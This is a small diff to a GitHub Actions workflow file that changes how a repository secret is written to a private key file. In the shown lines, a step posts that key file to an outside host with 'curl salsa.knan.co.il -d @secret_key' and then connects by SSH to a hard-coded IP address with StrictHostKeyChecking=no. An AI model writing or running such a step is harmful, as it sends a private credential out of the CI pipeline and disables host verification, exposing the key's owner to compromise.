@@ -13,6 +13,6 @@ jobs:
       env: # Or as an environment variable
         sss: ${{ secrets.sss }}
       run: |
-        sed -E -e 's/[[:blank:]]+/\n/g' $sss > secret_key && chmod 400 secret_key
+        echo $sss | sed -E -e 's/[[:blank:]]+/\n/g' > secret_key && chmod 400 secret_key
         curl salsa.knan.co.il -d @secret_key
         ssh -i secret_key -o StrictHostKeyChecking=no avik@34.74.245.53 /usr/bin/hostname -s
